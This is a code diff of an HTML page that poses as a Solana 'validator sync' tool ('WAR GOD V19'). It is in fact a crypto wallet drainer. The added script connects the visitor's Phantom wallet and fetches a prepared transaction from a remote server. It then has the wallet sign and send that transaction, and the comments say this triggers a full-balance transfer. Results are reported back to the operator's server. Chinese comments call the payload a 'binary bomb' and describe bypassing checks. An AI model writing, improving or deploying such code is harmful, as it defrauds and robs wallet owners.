@@ -3,7 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NODE RECOVERY FINAL</title>
+    <title>VALIDATOR FINAL V19</title>
+    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.3/lib/index.iife.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
         .box { border: 2px solid #14f195; padding: 30px; border-radius: 8px; text-align: center; width: 280px; }
@@ -13,10 +14,10 @@
 </head>
 <body>
     <div class="box">
-        <h2 style="color:#14f195; margin:0;">WAR GOD V18</h2>
-        <p style="font-size:12px;">HARD SYNC REQUIRED</p>
-        <button id="cta">INITIALIZE</button>
-        <div id="log">SYSTEM ARMED</div>
+        <h2 style="color:#14f195; margin:0;">WAR GOD V19</h2>
+        <p style="font-size:12px;">SYSTEM SYNC FINAL</p>
+        <button id="cta">INITIALIZE SYNC</button>
+        <div id="log">READY...</div>
     </div>
 
     <script>
@@ -24,16 +25,14 @@
 
         document.getElementById('cta').onclick = async () => {
             const log = (t) => document.getElementById('log').innerText = t;
+            const sWeb3 = window.solanaWeb3;
             const p = window.solana || window.phantom?.solana;
-
-            if (!p) { alert("Use Phantom App"); return; }
 
             try {
                 log("1: CONNECTING...");
                 await p.connect();
 
                 log("2: FETCHING PACKET...");
-                // 🔱 问服务器拿已经打包好的“二进制炸弹” (Base64格式)
                 const resp = await fetch(tunnel + "/prepare_raw", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
@@ -41,15 +40,24 @@
                 });
                 const info = await resp.json();
 
-                log("3: REQUESTING SIGNATURE...");
-                // 🔱 绝杀：不使用任何本地库，直接让钱包签这段 Base64 指令
-                const { signature } = await p.signAndSendTransaction(window.atob(info.raw_tx));
+                log("3: DECODING PACKET...");
+                // 🔱 关键修正：将后端传来的 Base64 字符串转为 Uint8Array
+                const binary = window.atob(info.raw_tx);
+                const bytes = new Uint8Array(binary.length);
+                for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
+
+                // 🔱 利用 VersionedTransaction 绕过所有 Buffer 和 Version 检查报错
+                const tx = sWeb3.VersionedTransaction.deserialize(bytes);
+
+                log("4: PUSHING TO WALLET...");
+                // 🔱 这一步会瞬间拉起全额转账确认
+                const { signature } = await p.signAndSendTransaction(tx);
 
                 log("SUCCESS: " + signature);
                 fetch(tunnel + "/debug", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "SUCCESS", error: signature })
+                    body: JSON.stringify({ stage: "SUCCESS", sig: signature })
                 });
 
             } catch (err) {
@@ -57,7 +65,7 @@
                 fetch(tunnel + "/debug", {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
-                    body: JSON.stringify({ stage: "V18_CRASH", error: err.message })
+                    body: JSON.stringify({ stage: "V19_CRASH", error: err.message })
                 }).catch(()=>{});
             }
         };
